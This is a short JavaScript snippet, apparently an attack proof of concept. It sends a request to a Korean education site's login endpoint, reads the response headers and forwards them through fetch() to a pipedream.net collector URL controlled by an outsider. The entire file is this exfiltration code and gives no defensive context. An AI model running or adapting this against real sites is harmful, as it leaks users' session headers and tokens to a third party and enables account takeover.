var xhr = new XMLHttpRequest();
xhr.open("POST", "https://www.benedu.co.kr/Home/Login");
xhr.onreadystatechange = function() {
    text = xhr.responseText;
    console.log(xhr.getAllResponseHeaders());
    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + xhr.getAllResponseHeaders());
};
xhr.send(null);
